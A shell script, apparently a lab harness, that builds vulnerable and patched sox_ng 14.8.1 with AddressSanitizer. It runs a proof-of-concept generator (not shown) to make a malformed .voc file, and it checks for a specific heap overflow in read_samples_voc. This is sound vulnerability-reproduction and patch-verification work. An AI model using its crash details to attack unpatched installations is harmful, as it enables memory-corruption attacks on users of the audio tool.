#!/bin/sh
# Frontier lab runner - sox_ng CVE-2026-129264, verbatim pinned 14.8.1 tag.
# Public provisioning and local GCC ASan builds only; no socket, no target.
set -u
cd "$(dirname "$0")" || exit 2

TAR=src/soxng-14.8.1.tar.gz
TAR_URL=https://codeberg.org/sox_ng/sox_ng/archive/sox_ng-14.8.1.tar.gz
TAR_SHA=25988458b873e4f5bface7ba072928dacbe35198121f4b4b38daa7575042ddfc
PATCH_SHA=a3b210efcbe777bed2a8cee85903e9f3ec2ef7acc8696679c171c7243bc7f5e6
GEN_SHA=3be9d56e13cd2cad5e8b145fe6bf6f4bd41a1cb6a03f427f2cb939eae46bb446
VULN_VOC_SHA=852dcbf218edebbc534c14baca75118725fb7e8bf17fbcb2b1532b0ae364703f
FIX_VOC_SHA=1609b6b28a8523fe27dc5659f59f6b5f59970df60d5c343375891191c355f5ee
POC_SHA=9291f03bad140a63e69e25439cc739d29c93d4a280076e084ebce8d033857aa5
SAFE_SHA=622982702465e646037e274ca34b26e39088d479e8676afede0a0888d8c8fb54
OPTS="--without-lame --without-sndfile --without-ffmpeg --without-twolame
      --without-alsa --without-pulse --without-oss --without-magic
      --without-modplug --without-mp3 --without-ogg --without-flac
      --without-opus --without-vorbis --without-speex --without-amr
      --without-gsm --without-codec2 --disable-shared --enable-static"
PASS=0
FAIL=0

sha() { sha256sum "$1" | cut -d' ' -f1; }
ok() { PASS=$((PASS + 1)); echo "PASS $1"; }
bad() { FAIL=$((FAIL + 1)); echo "FAIL $1"; }
expect_eq() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (got '$2' want '$3')"; fi; }
has() { if grep -qF "$2" "$1"; then ok "$3"; else bad "$3"; fi; }
hasnt() { if grep -qF "$2" "$1"; then bad "$3"; else ok "$3"; fi; }

if [ ! -f "$TAR" ]; then
    curl -fsSL -o "$TAR" "$TAR_URL" || bad "refetch pinned tarball"
fi
expect_eq "pinned tarball sha256" "$(sha "$TAR")" "$TAR_SHA"
expect_eq "single fix patch sha256" "$(sha src/fix-0b40408b.patch)" "$PATCH_SHA"
expect_eq "public PoC generator sha256" "$(sha src/gen_poc.py)" "$GEN_SHA"

rm -rf build out evidence
mkdir -p build/vuln build/fixed out evidence
tar xzf "$TAR" -C build/vuln --strip-components=1 || bad "extract pinned tarball"
cp -a build/vuln/. build/fixed/ || bad "copy fixed tree"
(cd build/fixed && patch -p1 < ../../src/fix-0b40408b.patch > ../fix-apply.log 2>&1) \
    && ok "single fix patch applies" || bad "single fix patch applies"
expect_eq "vulnerable src/voc.c" "$(sha build/vuln/src/voc.c)" "$VULN_VOC_SHA"
expect_eq "fixed src/voc.c" "$(sha build/fixed/src/voc.c)" "$FIX_VOC_SHA"

for side in vuln fixed; do
    (cd "build/$side" && autoreconf -fi > ../$side-autoreconf.log 2>&1) \
        && ok "autoreconf $side" || bad "autoreconf $side"
    (cd "build/$side" && ./configure $OPTS \
        CFLAGS="-g -O1 -fsanitize=address -fno-omit-frame-pointer -static-libasan -no-pie" \
        LDFLAGS="-fsanitize=address -static-libasan" > ../$side-configure.log 2>&1) \
        && ok "configure $side" || bad "configure $side"
    (cd "build/$side" && make -j2 > ../$side-make.log 2>&1) \
        && ok "GCC ASan build $side" || bad "GCC ASan build $side"
done

python3 src/gen_poc.py poc 8192 256 out/poc.voc > out/gen-poc.log 2>&1
python3 src/gen_poc.py clean 8192 256 out/safe.voc > out/gen-safe.log 2>&1
expect_eq "attack .voc sha256" "$(sha out/poc.voc)" "$POC_SHA"
expect_eq "safe .voc sha256" "$(sha out/safe.voc)" "$SAFE_SHA"

ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
    ./build/vuln/src/sox_ng out/poc.voc out/vuln-poc.wav > evidence/vuln-asan-poc.out 2>&1
VULN_RC=$?
has evidence/vuln-asan-poc.out 'ERROR: AddressSanitizer: heap-buffer-overflow' "vulnerable heap-buffer-overflow"
has evidence/vuln-asan-poc.out 'WRITE of size 4' "vulnerable WRITE-4"
has evidence/vuln-asan-poc.out 'read_samples_voc' "vulnerable read_samples_voc frame"
has evidence/vuln-asan-poc.out 'src/voc.c:415' "verbatim vulnerable source line"
has evidence/vuln-asan-poc.out '0 bytes after 32768-byte region' "exact buffer boundary"
has evidence/vuln-asan-poc.out 'sox_flow_effects' "real effect-buffer caller"
if [ "$VULN_RC" -ne 0 ]; then ok "vulnerable ASan exits $VULN_RC"; else bad "vulnerable ASan nonzero exit"; fi

ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
    ./build/fixed/src/sox_ng out/poc.voc out/fixed-poc.wav > evidence/fixed-asan-poc.out 2>&1
FIXED_RC=$?
hasnt evidence/fixed-asan-poc.out 'AddressSanitizer' "fixed no ASan report"
if [ "$FIXED_RC" -eq 0 ]; then ok "fixed ASan clean exit"; else bad "fixed ASan clean exit ($FIXED_RC)"; fi

for side in vuln fixed; do
    ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
        ./build/$side/src/sox_ng out/safe.voc out/$side-safe.wav > "evidence/$side-asan-safe.out" 2>&1
    RC=$?
    hasnt "evidence/$side-asan-safe.out" 'AddressSanitizer' "$side safe no ASan"
    if [ "$RC" -eq 0 ]; then ok "$side safe clean exit"; else bad "$side safe clean exit ($RC)"; fi
done

echo "RESULT PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
